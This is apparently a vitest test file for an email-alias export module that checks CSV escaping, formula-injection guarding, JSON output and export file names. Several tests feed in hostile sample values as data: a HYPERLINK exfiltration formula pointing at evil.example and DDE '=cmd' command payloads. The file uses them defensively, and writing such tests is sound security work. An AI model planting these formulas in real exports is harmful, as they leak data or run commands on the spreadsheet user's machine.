//
// Aster Communications Inc.
//
// Copyright (c) 2026 Aster Communications Inc.
//
// This file is part of this project.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the AGPLv3 as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// AGPLv3 for more details.
//
// You should have received a copy of the AGPLv3
// along with this program. If not, see <https://www.gnu.org/licenses/>.
//

import type { DecryptedEmailAlias } from "@/services/api/aliases";
import type { DecryptedDomainAddress } from "@/services/api/domains";
import type { DecryptedAliasDirectory } from "@/services/api/alias_directories";
import type { DecryptedGhostAlias } from "@/services/api/ghost_aliases";

import { describe, expect, it } from "vitest";

import {
  ALIAS_COLUMNS,
  CSV_LINE_BREAK,
  DIRECTORY_COLUMNS,
  GHOST_COLUMNS,
  UTF8_BOM,
  build_alias_rows,
  build_csv,
  build_directory_rows,
  build_domain_address_rows,
  build_ghost_rows,
  build_json,
  escape_csv_cell,
  export_date_stamp,
  export_file_name,
  is_exportable_alias,
  neutralize_formula,
  rows_to_objects,
  strip_formula_guard,
} from "./alias_export_utils";

function make_alias(
  overrides: Partial<DecryptedEmailAlias> = {},
): DecryptedEmailAlias {
  return {
    id: "alias-1",
    local_part: "malwarebytes",
    display_name: "Mr. Jarvis",
    note: "Malwarebytes Feed",
    websites: ["www.malwarebytes.com/malware"],
    alias_address_hash: "hash",
    domain: "aster.cx",
    full_address: "malwarebytes@aster.cx",
    is_enabled: true,
    is_random: false,
    created_at: "2026-01-04T10:00:00Z",
    updated_at: "2026-01-04T10:00:00Z",
    ...overrides,
  };
}

describe("neutralize_formula", () => {
  it("prefixes cells that start with a formula trigger", () => {
    expect(neutralize_formula("=1+1")).toBe("'=1+1");
    expect(neutralize_formula("+1")).toBe("'+1");
    expect(neutralize_formula("-1")).toBe("'-1");
    expect(neutralize_formula("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralizes the classic exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.example/?d="&A1,"Click me")';

    expect(neutralize_formula(payload).startsWith("'=")).toBe(true);
  });

  it("neutralizes triggers hidden behind leading whitespace", () => {
    expect(neutralize_formula("   =cmd|'/c calc'!A1")).toBe(
      "'   =cmd|'/c calc'!A1",
    );
  });

  it("neutralizes leading control characters", () => {
    expect(neutralize_formula("\t=1+1")).toBe("'\t=1+1");
    expect(neutralize_formula("\r=1+1")).toBe("'\r=1+1");
    expect(neutralize_formula("\n=1+1")).toBe("'\n=1+1");
  });

  it("leaves ordinary values untouched", () => {
    expect(neutralize_formula("malwarebytes@aster.cx")).toBe(
      "malwarebytes@aster.cx",
    );
    expect(neutralize_formula("Mr. Jarvis")).toBe("Mr. Jarvis");
    expect(neutralize_formula("")).toBe("");
    expect(neutralize_formula("2026-01-04T10:00:00Z")).toBe(
      "2026-01-04T10:00:00Z",
    );
  });
});

describe("escape_csv_cell", () => {
  it("always quotes and doubles embedded quotes", () => {
    expect(escape_csv_cell('say "hi"')).toBe('"say ""hi"""');
  });

  it("keeps commas and newlines inside the quoted field", () => {
    expect(escape_csv_cell("a,b")).toBe('"a,b"');
    expect(escape_csv_cell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("renders empty for null and undefined", () => {
    expect(escape_csv_cell(null)).toBe('""');
    expect(escape_csv_cell(undefined)).toBe('""');
  });

  it("renders booleans as true/false", () => {
    expect(escape_csv_cell(true)).toBe('"true"');
    expect(escape_csv_cell(false)).toBe('"false"');
  });

  it("joins arrays with the website separator", () => {
    expect(escape_csv_cell(["a.com", "b.com"])).toBe('"a.com; b.com"');
    expect(escape_csv_cell([])).toBe('""');
  });

  it("escapes a quote-breakout attempt in a note", () => {
    const cell = escape_csv_cell('","=1+1,"');

    expect(cell).toBe('""",""=1+1,"""');
    expect(cell.slice(1, -1).replace(/""/g, "")).not.toContain('"');
  });
});

describe("build_csv", () => {
  it("prepends a UTF-8 BOM and uses CRLF line endings", () => {
    const csv = build_csv(["address"], [["a@aster.cx"]]);

    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toBe(
      `${UTF8_BOM}"address"${CSV_LINE_BREAK}"a@aster.cx"${CSV_LINE_BREAK}`,
    );
  });

  it("terminates the final row so the file ends with a newline", () => {
    const csv = build_csv(["a"], [["1"], ["2"]]);

    expect(csv.endsWith(CSV_LINE_BREAK)).toBe(true);
    expect(csv.split(CSV_LINE_BREAK).filter(Boolean)).toHaveLength(3);
  });

  it("emits headers only when there are no rows", () => {
    expect(build_csv(["address"], [])).toBe(
      `${UTF8_BOM}"address"${CSV_LINE_BREAK}`,
    );
  });

  it("preserves non-latin and RTL text verbatim", () => {
    const csv = build_csv(["display_name"], [["日本語 مرحبا Ünïcödé"]]);

    expect(csv).toContain('"日本語 مرحبا Ünïcödé"');
  });
});

describe("build_alias_rows", () => {
  it("maps every requested column in order", () => {
    const rows = build_alias_rows([make_alias()], ALIAS_COLUMNS);

    expect(rows).toEqual([
      [
        "malwarebytes@aster.cx",
        "Mr. Jarvis",
        "Malwarebytes Feed",
        ["www.malwarebytes.com/malware"],
        true,
        "2026-01-04T10:00:00Z",
      ],
    ]);
  });

  it("honours a narrowed column selection", () => {
    const rows = build_alias_rows([make_alias()], ["address", "enabled"]);

    expect(rows).toEqual([["malwarebytes@aster.cx", true]]);
  });

  it("renders missing optional fields as empty strings", () => {
    const rows = build_alias_rows(
      [
        make_alias({
          display_name: undefined,
          note: undefined,
          websites: undefined,
        }),
      ],
      ALIAS_COLUMNS,
    );

    expect(rows[0][1]).toBe("");
    expect(rows[0][2]).toBe("");
    expect(rows[0][3]).toEqual([]);
  });
});

describe("is_exportable_alias", () => {
  it("rejects aliases whose ciphertext could not be decrypted", () => {
    expect(is_exportable_alias(make_alias({ decryption_failed: true }))).toBe(
      false,
    );
  });

  it("rejects aliases with a malformed address", () => {
    expect(is_exportable_alias(make_alias({ full_address: "" }))).toBe(false);
    expect(is_exportable_alias(make_alias({ full_address: "broken" }))).toBe(
      false,
    );
  });

  it("accepts a normal alias", () => {
    expect(is_exportable_alias(make_alias())).toBe(true);
  });
});

describe("build_domain_address_rows", () => {
  it("joins local part and domain into a full address", () => {
    const address = {
      id: "d1",
      domain_id: "dom1",
      local_part: "shop",
      display_name: "Shop",
      is_enabled: false,
      is_primary: false,
      created_at: "2026-02-01T00:00:00Z",
      domain_name: "example.com",
    } satisfies DecryptedDomainAddress & { domain_name: string };

    expect(
      build_domain_address_rows(
        [address],
        ["address", "display_name", "enabled", "created_at"],
      ),
    ).toEqual([["shop@example.com", "Shop", false, "2026-02-01T00:00:00Z"]]);
  });
});

describe("build_directory_rows", () => {
  it("exports the decrypted label rather than the hash", () => {
    const directory = {
      id: "dir1",
      directory_hash: "SHOULD-NOT-APPEAR",
      domain: "aster.cx",
      auto_create_enabled: true,
      color: "#4ade80",
      created_at: "2026-01-09T00:00:00Z",
      label: "shop",
    } satisfies DecryptedAliasDirectory;

    const rows = build_directory_rows([directory], DIRECTORY_COLUMNS);

    expect(rows).toEqual([
      ["shop", "aster.cx", true, "#4ade80", "2026-01-09T00:00:00Z"],
    ]);
    expect(build_csv(DIRECTORY_COLUMNS, rows)).not.toContain(
      "SHOULD-NOT-APPEAR",
    );
  });
});

describe("build_ghost_rows", () => {
  it("exports address, state and expiry", () => {
    const ghost = {
      id: "g1",
      encrypted_local_part: "ct",
      local_part_nonce: "n",
      alias_address_hash: "h",
      domain: "realiased.me",
      is_enabled: true,
      expires_at: "2026-08-01T00:00:00Z",
      created_at: "2026-07-01T00:00:00Z",
      local_part: "ghost1",
      full_address: "ghost1@realiased.me",
    } satisfies DecryptedGhostAlias;

    expect(build_ghost_rows([ghost], GHOST_COLUMNS)).toEqual([
      [
        "ghost1@realiased.me",
        true,
        "2026-08-01T00:00:00Z",
        "2026-07-01T00:00:00Z",
      ],
    ]);
  });
});

describe("json export", () => {
  it("keeps websites as an array instead of a joined string", () => {
    const rows = build_alias_rows(
      [make_alias({ websites: ["a.com", "b.com"] })],
      ALIAS_COLUMNS,
    );
    const parsed = JSON.parse(
      build_json(ALIAS_COLUMNS, rows, "2026-07-29T00:00:00Z"),
    );

    expect(parsed.version).toBe(1);
    expect(parsed.count).toBe(1);
    expect(parsed.entries[0].websites).toEqual(["a.com", "b.com"]);
    expect(parsed.entries[0].enabled).toBe(true);
  });

  it("does not apply csv formula guarding to json values", () => {
    const rows = build_alias_rows(
      [make_alias({ note: "=1+1" })],
      ALIAS_COLUMNS,
    );
    const parsed = JSON.parse(
      build_json(ALIAS_COLUMNS, rows, "2026-07-29T00:00:00Z"),
    );

    expect(parsed.entries[0].note).toBe("=1+1");
  });

  it("maps rows onto the selected headers", () => {
    expect(rows_to_objects(["address", "enabled"], [["a@b.c", false]])).toEqual(
      [{ address: "a@b.c", enabled: false }],
    );
  });
});

describe("file naming", () => {
  it("stamps a stable date", () => {
    expect(export_date_stamp(new Date("2026-07-29T23:59:59Z"))).toBe(
      "2026-07-29",
    );
  });

  it("uses a fixed name per source with no user input", () => {
    expect(export_file_name("aliases", "csv", "2026-07-29")).toBe(
      "aster-aliases-2026-07-29.csv",
    );
    expect(export_file_name("domain_addresses", "csv", "2026-07-29")).toBe(
      "aster-domain-addresses-2026-07-29.csv",
    );
    expect(export_file_name("directories", "json", "2026-07-29")).toBe(
      "aster-directories-2026-07-29.json",
    );
    expect(export_file_name("ghost", "csv", "2026-07-29")).toBe(
      "aster-ghost-aliases-2026-07-29.csv",
    );
  });
});

describe("end to end csv", () => {
  it("produces a hostile alias row that is inert in a spreadsheet", () => {
    const alias = make_alias({
      display_name: '=cmd|"/c calc"!A1',
      note: 'note with "quotes", a comma and\na newline',
      websites: ["-evil.example", "@handle.example"],
    });
    const rows = build_alias_rows([alias], ALIAS_COLUMNS);
    const csv = build_csv(ALIAS_COLUMNS, rows);

    for (const line of csv.split(CSV_LINE_BREAK)) {
      for (const trigger of [",=", ",+", ",-", ",@"]) {
        expect(line).not.toContain(`${trigger}`);
      }
    }

    expect(csv).toContain(`"'=cmd|""/c calc""!A1"`);
    expect(csv).toContain(`"'-evil.example; @handle.example"`);
  });
});

describe("strip_formula_guard", () => {
  it("undoes the guard for every trigger character", () => {
    for (const trigger of ["=", "+", "-", "@"]) {
      const original = `${trigger}sum(1,1)`;

      expect(strip_formula_guard(neutralize_formula(original))).toBe(original);
    }
  });

  it("undoes the guard for leading whitespace triggers", () => {
    for (const original of ["\t=1+1", "\r=1+1", "\n=1+1", "   =1+1"]) {
      expect(strip_formula_guard(neutralize_formula(original))).toBe(original);
    }
  });

  it("leaves a note that legitimately starts with an apostrophe alone", () => {
    for (const value of ["'tis a note", "'", "''", "'hello"]) {
      expect(strip_formula_guard(value)).toBe(value);
    }
  });

  it("is a no-op on values that were never guarded", () => {
    for (const value of ["", "plain", "a=b", "user@example.com"]) {
      expect(strip_formula_guard(value)).toBe(value);
    }
  });

  it("removes exactly one layer of guarding", () => {
    expect(strip_formula_guard("''=1+1")).toBe("'=1+1");
    expect(strip_formula_guard("'''=1+1")).toBe("''=1+1");
  });

  it("stays an exact inverse for notes that already start with an apostrophe", () => {
    for (const original of ["'=1+1", "''=1+1", "'@handle", "'\t=1+1"]) {
      expect(neutralize_formula(original)).toBe(`'${original}`);
      expect(strip_formula_guard(neutralize_formula(original))).toBe(original);
    }
  });

  it("round-trips every alias text field through export and import", () => {
    const values = [
      "Mr. Jarvis",
      '=HYPERLINK("http://evil.example","x")',
      "-lead",
      "+lead",
      "@handle",
      "'tis mine",
      "日本語のメモ",
      "",
    ];

    for (const value of values) {
      expect(strip_formula_guard(neutralize_formula(value))).toBe(value);
    }
  });
});
